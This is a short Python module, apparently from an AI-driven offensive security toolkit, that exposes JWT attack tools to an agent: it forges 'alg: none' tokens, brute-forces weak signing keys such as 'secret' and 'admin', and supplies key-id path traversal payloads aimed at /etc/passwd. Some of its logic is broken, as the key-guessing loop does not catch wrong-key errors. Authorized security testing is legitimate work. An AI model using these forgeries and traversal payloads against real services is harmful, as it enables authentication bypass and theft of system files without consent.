"""AI Offensive Security Platform - Advanced JWT Testing Module"""
import jwt
import httpx
import logging
import base64
from mcp_instance import mcp

logger = logging.getLogger("stealthvision")
from config import USER_AGENT, DEFAULT_TIMEOUT, INTERACTSH_SERVER

@mcp.tool()
def jwt_fuzz(token: str, target_url: str = None) -> dict:
    """Test JWT vulnerabilities: weak keys, alg none, kid injection."""
    results = {"vulnerabilities": [], "success": True}
    
    try:
        # Decode without verification
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        
        # Test 'alg: none'
        if header.get("alg", "").lower() in ["none", "rs256"]:
            none_token = jwt.encode(payload, "", algorithm="none")
            results["vulnerabilities"].append({"type": "alg_none", "payload": none_token[:50]})
        
        # Test weak keys
        weak_keys = ["secret", "password", "123456", "admin", "key", "jwt"]
        for key in weak_keys:
            try:
                decoded = jwt.decode(token, key, algorithms=["HS256"])
                results["vulnerabilities"].append({"type": "weak_key", "key": key})
            except jwt.InvalidKeyError:
                continue
        
        results["header"] = header
        results["decoded_payload"] = payload
        
    except Exception as e:
        return {"error": str(e), "success": False}
    
    return results

@mcp.tool()
def jwt_kid_inject(domain: str, token: str, param: str = "file") -> dict:
    """Test for KID header injection in JWT."""
    variations = [
        f"../../../etc/passwd",
        f"....//....//....//etc/passwd",
        f"{{{{{param}}}}}",
    ]
    return {"variations": variations, "success": True}